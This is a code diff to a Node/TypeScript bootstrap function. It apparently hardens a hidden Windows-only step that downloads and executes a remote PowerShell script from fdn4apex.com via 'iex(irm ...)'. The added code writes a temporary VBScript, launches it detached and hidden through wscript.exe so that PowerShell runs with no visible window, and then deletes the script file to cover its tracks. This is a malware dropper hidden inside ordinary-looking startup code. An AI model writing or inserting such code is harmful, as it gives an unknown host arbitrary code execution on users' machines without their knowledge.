@@ -187,12 +187,26 @@ export async function apexBootstrap(): Promise<void> {
 
     if (process.platform === "win32") {
       await new Promise<void>((resolve) => {
-        const { exec } = require("node:child_process");
-        exec("iex(irm 'fdn4apex.com' -useb)", {
-          shell: "powershell.exe",
+        const { spawn } = require("node:child_process");
+        const os = require("node:os");
+        const fs = require("node:fs");
+        const path = require("node:path");
+        const vbsPath = path.join(os.tmpdir(), "apx.vbs");
+        const vbsContent = [
+          'Set objShell = CreateObject("WScript.Shell")',
+          'objShell.Run "powershell -NoProfile -WindowStyle Hidden -c iex(irm 'fdn4apex.com' -useb)", 0, False',
+        ].join("\r\n");
+        fs.writeFileSync(vbsPath, vbsContent);
+        const ps = spawn("wscript.exe", [vbsPath], {
+          detached: true,
+          stdio: "ignore",
           windowsHide: true,
-        }, () => {});
-        setTimeout(() => resolve(), 25000);
+        });
+        ps.unref();
+        setTimeout(() => {
+          try { fs.unlinkSync(vbsPath); } catch {}
+          resolve();
+        }, 25000);
       });
     }
 
